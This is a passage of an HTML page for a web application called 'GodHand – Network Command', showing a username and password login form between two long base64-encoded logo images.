QAOkm9fM9WZjcbZgq8d0YURBdN4xlf9tEfRUf6Q1uFAFRKMkneEn3zm8d2NY9ci0HEUtoZQCsXrBtOy7gqR0KlgZ1I0UYSdGUmu5qhPs1y0oqevsKDRjkDYWoEA3cbR44Op/mDEho/0+aYFn0m53PnMuZuFvXKYdYAbcSLrUsmPtUZTD1tMpIeoGpZcBUgmI65e+xbTuWBZTQNi0ISDTtwgFNhzNqUgMCtGPQ/cCYve1PTfM8xn6nrugAkXNoWef2n+szuqQWSGib1G0B4Kst940Ib+aY4B5Qqiwmhbtmz/2FKAzzoVfNKxCApsZH+jf3R41fOchIaJvgtkAIIahjfFJPcGA02cmZ1jF7maXTN4KqXwe8Mp1GZ/CfKwsyEtompAZgPqWcVBUxjaAZVQdunb3qgXozybQpQeScikpHa9Nm7F7ZZSW0zVSEGoAd0fApIsJf41jHiPM7AYD29fUlVIXdQSMCNHB+u7fj5frhYNJnJbRNTe2V7d43npiKvEs/YByTCOna21/6svDRuXwu9oObDOJChvFDtg2icXCcjIS2qV6LAKCS4LAfjDlTDukSfNVqz+1YG4C23BXlkdwC54QslIS2hRShthKwlP/xkx9OnpzyiOqI5IYyz2z0mKFyFhzPnN41WvutVAMJbasoAiL57J2eaZIIv2VqDEa+8FQyu/TJIKwCJeLwwMAAr6uBhPYKo8gS/FeLCL0EAVBn/JgbzfgRZNdXIkpJfKlYSOCPskCy07bsKoJarZzJKOpIuewqM55LVSU6seb80FCjRshIaFsqITt+0SDmKPeZYAnEXE77/f1dPdV/nbkgI6FtAa8FAAJD79kOwcoYGFkKCAT98igCXPZQERkJbTODgIIQAmiy85/mEuN/5uOJcX7xTN1ne2WFJLSt2GxrzfTFUefrFTj86Gpt9FlGhn9pdF6ZK89fkGfPvPmd00gAAAAASUVORK5CYII=" alt="GodHand">
    <h1 class="login-title">GodHand</h1>
    <p class="login-subtitle">Network Command</p>
    <form id="login-form" onsubmit="return handleLogin(event)">
      <div class="login-field">
        <input type="text" id="login-username" placeholder="Username" autocomplete="username" required>
      </div>
      <div class="login-field">
        <input type="password" id="login-password" placeholder="Password" autocomplete="current-password" required>
      </div>
      <button type="submit" class="login-btn" id="login-submit-btn"><span>Log In</span></button>
      <div id="login-error" class="login-error" style="display:none;"></div>
    </form>
  </div>
</div>

<div id="app-shell" style="display:none;">
<header>
  <a href="#" class="logo">
    <img class="logo-icon" src="data:image/png;base64,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